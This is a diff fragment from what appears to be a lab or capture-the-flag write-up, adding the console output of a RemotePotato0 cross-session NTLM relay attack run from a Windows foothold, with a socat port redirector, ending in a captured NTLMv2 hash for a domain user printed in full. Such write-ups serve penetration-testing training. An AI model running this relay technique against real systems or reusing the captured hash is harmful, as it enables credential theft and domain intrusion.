@@ -391,7 +391,26 @@ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8080
 Started a socat listener
 
 ```python
+PS C:\Users\simon.watson\Desktop> C:\programdata\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.90 -p 8080
+[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 8080
+[*] Example Network redirector:
+        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8080
+[*] Starting the RPC server to capture the credentials hash from the user authentication!!
+[*] RPC relay server listening on port 9997 ...
+[*] Spawning COM object in the session: 1
+[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
+[*] Starting RogueOxidResolver RPC Server listening on port 8080 ... 
+[*] IStoragetrigger written: 104 bytes
+[*] ServerAlive2 RPC Call
+[*] ResolveOxid2 RPC call
+[+] Received the relayed authentication on the RPC relay server on port 9997
+[*] Connected to RPC Server 127.0.0.1 on port 8080
+[+] User hash stolen!
 
+NTLMv2 Client   : AWSJPDC0522
+NTLMv2 Username : SHIBUYA\Nigel.Mills
+NTLMv2 Hash     : Nigel.Mills::SHIBUYA:79335a02a3610233:c4023f4f08e613333affe042c375ac0f:0101000000000000945b690e6db9dc0171134e5e2ddb29b20000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800945b690e6db9dc0106000400060000000800300030000000000000000100000000200000c8bdde354ca45207e5b37c05c429a0770976a5c302a5443bc4777564440fe6040a00100000000000000000000000000000000000090000000000000000000000
 ```
+
 
 
